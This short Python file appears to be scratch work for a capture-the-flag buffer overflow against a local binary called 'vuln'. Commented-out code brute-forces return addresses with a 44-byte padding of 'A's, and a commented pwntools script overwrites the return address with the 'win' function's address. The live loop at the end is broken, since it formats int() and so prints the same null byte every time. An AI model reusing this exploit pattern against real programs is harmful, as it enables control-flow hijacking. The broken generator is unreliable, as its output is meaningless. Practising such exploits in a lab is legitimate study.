# import subprocess

# start = 0x08049100
# end   = 0x080491ff

# for raw_hex in range(start,end):
#     attack_ready_hex = ''
#     str_hex = str(hex(raw_hex))

#     for i in range(2,len(str_hex), 2):
#         attack_ready_hex = "\\x" + str_hex[i:i+2] + attack_ready_hex
    

#     subprocess.run('vuln', input=b'A'*44 + attack_ready_hex.encode())



# # # #!/usr/bin/env python3

# # import sys
# # from pwn import *
# # import subprocess


# # vuln = ELF("./vuln", checksec=False)
# # addr = p32(vuln.symbols["win"])

# # b = b'A'*44
# # b += addr

# # subprocess.run('./vuln', input=b)

# # b'\xf6\x91\x04\x08'

import subprocess
  
start = 0x0000
end   = 0xffff

for raw_hex in range(start,end):
    attack_ready_hex = ''
    str_hex = str(hex(raw_hex))

    for i in range(2,len(str_hex), 2):
        attack_ready_hex = '\\x{:02X}'.format(int()) + attack_ready_hex
    print('payload', attack_ready_hex)


